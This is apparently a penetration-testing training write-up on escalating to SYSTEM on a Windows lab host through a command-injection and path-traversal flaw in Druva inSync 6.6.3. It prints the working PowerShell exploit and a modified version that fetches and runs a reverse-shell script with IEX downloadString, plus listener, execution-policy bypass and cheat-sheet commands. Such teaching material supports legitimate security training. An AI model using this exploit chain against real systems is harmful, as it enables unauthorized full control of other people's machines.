# Attacking the OS, Part 4: Vulnerable Services

## Table of Contents
1. [Why Third-Party Software Is a Privesc Goldmine](#1-why-third-party-software-is-a-privesc-goldmine)
2. [Step 1: Enumerate Installed Programs](#2-step-1-enumerate-installed-programs)
3. [Step 2: Confirm the Vulnerable Service Is Actually Running](#3-step-2-confirm-the-vulnerable-service-is-actually-running)
4. [Understanding the Druva inSync Vulnerability](#4-understanding-the-druva-insync-vulnerability)
5. [Full Walkthrough: Exploiting Druva inSync for a SYSTEM Shell](#5-full-walkthrough-exploiting-druva-insync-for-a-system-shell)
6. [Cheat Sheet](#6-cheat-sheet)
7. [Big-Picture Takeaways](#7-big-picture-takeaways)

---

## 1. Why Third-Party Software Is a Privesc Goldmine

Here's an uncomfortable truth for defenders: a Windows machine can be **perfectly patched** and **carefully configured**, and still be wide open to privilege escalation — simply because of a **vulnerable piece of third-party software** installed on it.

This becomes especially likely in organizations that let regular users install their own software. Every extra application is one more potential weak point, and it's extremely common on real assessments to find a mix of business tools, backup agents, VPN clients, and other utilities — any one of which might carry its own, completely unrelated-to-Windows vulnerability.

**The range of outcomes varies:**
- Some vulnerable services/applications can be leveraged to escalate all the way to **SYSTEM**.
- Others might only cause a **denial of service** (crashing something, rather than granting access).
- Still others might simply **leak sensitive data**, like a configuration file with a stored password.

**Analogy:** Think of a well-secured office building with reinforced doors, a trained security guard, and a monitored alarm system — but one tenant has installed their own personal smart lock on an interior door, bought cheaply online, with a known manufacturer flaw that lets anyone open it with a basic trick. The building's own security is irrelevant to that one bad lock.

---

## 2. Step 1: Enumerate Installed Programs

The starting point is the same installed-software enumeration covered in an earlier document:

```
C:\evilcorp> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

Most of this list looks like standard, boring Windows 10 workstation clutter (runtime libraries, OS update components, VMware guest tools). But one entry stands out: **`Druva inSync 6.6.3`** — a commercial backup and compliance tool, not a default Windows component.

**The research step:** a quick search for "Druva inSync 6.6.3 vulnerability" turns up a known issue — this specific version is vulnerable to a **command injection attack via an exposed RPC (Remote Procedure Call) service.** A public [proof-of-concept](https://www.exploit-db.com/exploits/49211) exploit exists for it (via Exploit-DB), and the flaw was originally documented in detail by independent security research [here](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/).

**What Druva inSync actually is:** a tool marketed for "Integrated backup, eDiscovery, and compliance monitoring." Critically, its client application runs a background **service** under the extremely powerful **`NT AUTHORITY\SYSTEM`** account — meaning any flaw letting you control that service's behavior could hand you SYSTEM-level access.

**Analogy:** Finding one unusual, named application in a long list of generic system software is like scanning a company's visitor sign-in sheet full of "John Smith, Delivery" entries and spotting one that reads "Dr. Chaos, Guest of Facilities" — it's the name that doesn't fit the pattern that deserves a second look.

---

## 3. Step 2: Confirm the Vulnerable Service Is Actually Running

Finding the software installed is a good start, but you need to confirm its vulnerable component is actually **active and listening** before trying to exploit it.

### Check the Port

The research mentioned the flaw is reachable through a local service on **port 6064**. Confirming with `netstat`:

```
C:\evilcorp> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```
Notice this service is only listening on `127.0.0.1` (localhost) — exactly the kind of "locally-only, so it must be safe" assumption discussed in an earlier document on process communication. Once you have any shell on the box at all, that assumption no longer holds.

### Map the Port Back to a Process

```
PS C:\evilcorp> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

PID `3324` (the one shown as `LISTENING` on port 6064) belongs to a process named `inSyncCPHwnet64` — consistent with it being part of the Druva inSync software suite.

### Double-Check via the Services List

```
PS C:\evilcorp> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```
*(The `?` here is PowerShell shorthand for the `Where-Object` cmdlet, filtering the full service list down to just entries whose display name starts with "Druva".)*

Three separate checks (installed software list, open port, and running service) all point to the same conclusion: **Druva inSync is installed, running, and reachable.** Time to look at the actual vulnerability.

---

## 4. Understanding the Druva inSync Vulnerability

The flaw is a **command injection** issue reachable through the application's own custom RPC protocol — meaning the service accepts network messages in Druva's own proprietary format, and a specially-crafted message can trick it into running an arbitrary operating system command.

### The Public Proof-of-Concept

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

**Breaking this down piece by piece:**

| Piece | Purpose |
|---|---|
| `$s.Connect("127.0.0.1", 6064)` | Opens a raw TCP connection directly to the vulnerable local service |
| `$header` | A "magic" string (`"inSync PHC RPCW[v0002]"`) the service expects at the start of every message, identifying it as a valid request in Druva's own custom protocol |
| `$rpcType` | A type code telling the service what *kind* of RPC call this is |
| `$command` | The actual command to execute, with a twist — see below |
| `$length` | Simply tells the service how many bytes the following command data will be, so it knows when to stop reading |

**The clever part is in `$command`:** instead of just running `cmd.exe` directly, the path specified is:
```
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c net user pwnd /add
```
This uses **path traversal** (`..\` segments, each meaning "go up one folder") starting from a legitimate-looking location *inside* Druva's own installation folder, and walking back up three levels (`inSync4` → `Druva` → `ProgramData` → `C:\`) before descending back down into `Windows\System32\cmd.exe`. **Why bother with this roundabout path instead of just writing `C:\Windows\System32\cmd.exe` directly?** This is a classic sign of an input validation flaw: the vulnerable code likely checks that the supplied path *starts with* an expected, "safe-looking" prefix (Druva's own installation directory) before executing it — but fails to properly resolve and re-check the path *after* the `..\` traversal segments collapse it down to an entirely different, unintended location. The check sees a trusted-looking prefix and approves it; the operating system then resolves the full path literally, landing on `cmd.exe` instead.

The end result: the service, running as SYSTEM, executes `cmd.exe /c net user pwnd /add` — creating a new user account, entirely under attacker control.

---

## 5. Full Walkthrough: Exploiting Druva inSync for a SYSTEM Shell

### Step 1 — Decide what command to run

The proof-of-concept's default command (`net user pwnd /add`) works, but it's **noisy** — it leaves a new, unexplained user account sitting on the system, which is exactly the kind of change a careful penetration tester tries to avoid making on a client's live system unless necessary. A **reverse shell** is a cleaner, less-intrusive alternative: no lasting account is created, and once the shell session ends, there's no persistent evidence left behind on the host.

### Step 2 — Prepare a PowerShell reverse shell script

Download a known PowerShell reverse-shell script ([Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)) to your own attack machine, rename it to something simple like `shell.ps1`, and append a line at the bottom calling it with your own details:
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

### Step 3 — Modify the exploit to fetch and run that script

Instead of `net user pwnd /add`, change the PoC's `$cmd` variable to a command that downloads and runs your reverse shell script entirely **in memory** (without ever saving a file to disk, reducing your footprint):
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```
*(`IEX` is short for `Invoke-Expression` — it takes a string of PowerShell code and actually executes it, which is exactly how a downloaded script gets run without being written to disk first.)*

### Step 4 — Host the script

```
$ python3 -m http.server 8080
```

### Step 5 — Start a listener and trigger the exploit

```
$ nc -lvnp 9443
```

On the target, you may first need to relax PowerShell's execution policy (which otherwise blocks running unsigned/downloaded scripts) for just this one process:
```
Set-ExecutionPolicy Bypass -Scope Process
```
Then run the modified exploit script against the local Druva inSync service.

### Step 6 — Catch the shell

```
$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32>whoami

nt authority\system

PS C:\WINDOWS\system32> hostname

WINLPE-WS01
```

**Worth noting:** the shell's own startup banner identifies the running context as `WINLPE-WS01$` (the machine's own computer account, recognizable by the trailing `$`), while `whoami` reports `nt authority\system` a moment later. Both of these descriptions point to the same underlying reality — processes running as the all-powerful `LocalSystem` account on a non-domain-joined ("workgroup") machine can sometimes be reported slightly differently depending on which Windows API a given script happens to query — but the practical result confirmed by `whoami` is unambiguous: **full SYSTEM access**, achieved purely through a vulnerable third-party backup client, with zero Windows patches or built-in misconfigurations involved.

---

## 6. Cheat Sheet

| Goal | Command |
|---|---|
| List installed third-party software | `wmic product get name` |
| Check if a specific port is in use, and by which process | `netstat -ano \| findstr <port>` |
| Map a PID to its process name | `Get-Process -Id <pid>` |
| Find a running service by (partial) display name | `Get-Service \| ? {$_.DisplayName -like '<pattern>*'}` |
| Host a payload/script for download | `python3 -m http.server <port>` |
| Bypass PowerShell's script execution restriction (current process only) | `Set-ExecutionPolicy Bypass -Scope Process` |
| Download and execute a script in memory (no file written) | `IEX(New-Object Net.Webclient).downloadString('<url>')` |

### Decision Flow: "Is This Third-Party App Worth Investigating?"

```
          ┌────────────────────────────────┐
          │  wmic product get name         │
          │  (scan installed software)     │
          └───────────────┬────────────────┘
                          │
          Does anything look non-standard /
          third-party / unusual for this
          type of machine?
                          │
             ┌────────────┴───────────────┐
             │ Yes                        │ No obviously unusual software
             ▼                            ▼
   Search "<app> <version>           Move on to other privesc
   vulnerability" / known CVE         categories (weak permissions,
   databases                          kernel exploits, etc.)
             │
   ┌─────────┴────────────┐
   │ Known vulnerability  │ Nothing found
   │ with public PoC      │
   ▼                      ▼
 Confirm the service   Consider manual analysis
 is actually running   (fuzzing, reverse
 (netstat, Get-Process, engineering) — likely
 Get-Service)           out of scope for a
   │                    quick enumeration pass
   ▼
 Run/adapt the PoC
 (ideally swap noisy
 payloads like "add
 user" for a reverse
 shell)
   │
   ▼
 SYSTEM (or whatever
 privilege level the
 vulnerable service
 runs under)
```

---

## 7. Big-Picture Takeaways

1. A perfectly patched, well-configured Windows OS can still be trivially compromised through a single vulnerable piece of third-party software — OS-level hardening alone is never the whole picture.
2. Always enumerate installed applications on every engagement, even on machines that otherwise look locked-down; one unusual entry in an otherwise boring software list can be the entire path to SYSTEM.
3. A service listening only on `127.0.0.1` is not inherently safe — it's only safe against someone who doesn't already have a foothold on the box, which doesn't describe you during privilege escalation.
4. Path traversal (`..\`) tricks that escape a trusted-looking directory prefix are a classic pattern worth recognizing — they often indicate the underlying code validates a path's *prefix* without properly re-checking where the path actually resolves to afterward.
5. When adapting a public proof-of-concept exploit, prefer quieter payloads (like an in-memory reverse shell) over noisy, persistent ones (like creating a new user account) — minimizing unnecessary changes to a client's live system is both good practice and good professionalism.
6. Downloading and executing scripts directly in memory (`IEX` + `downloadString`) avoids leaving files on disk, reducing your footprint during an engagement.
7. This entire technique required zero Windows vulnerabilities, zero misconfigured permissions, and zero missing Microsoft patches — a strong argument for why organizations should restrict local admin rights and consider application whitelisting, regardless of how well they handle OS-level patching.
